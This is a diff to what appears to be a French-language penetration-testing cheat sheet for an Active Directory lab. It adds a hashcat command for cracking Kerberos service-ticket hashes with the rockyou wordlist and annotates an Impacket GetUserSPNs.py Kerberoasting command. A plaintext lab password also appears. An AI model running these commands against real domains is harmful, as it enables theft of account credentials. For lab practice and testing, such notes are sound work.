@@ -32,6 +32,8 @@ use <share> ## Se connecter à un share
 
 ```bash
 hashcat -m 18200 asrep.txt /opt/lists/rockyou.txt ## Crack le hash AS-REP
+hashcat -m 13100 hash.txt /opt/lists/rockyou.txt ## Crack le hash Kerberos
+
 ```
 
 ## Bloodhound
@@ -48,6 +50,6 @@ mdp: @PentestAD1234!!
 ## GetUsersSPN
 
 ```bash
-GetUserSPNs.py imperium.local/$USER:$PASSWORD -dc-ip $IP -request-user thufir.hawat
+GetUserSPNs.py imperium.local/$USER:$PASSWORD -dc-ip $IP -request-user thufir.hawat ## Récupérer ticket kerberos 
 ```
 
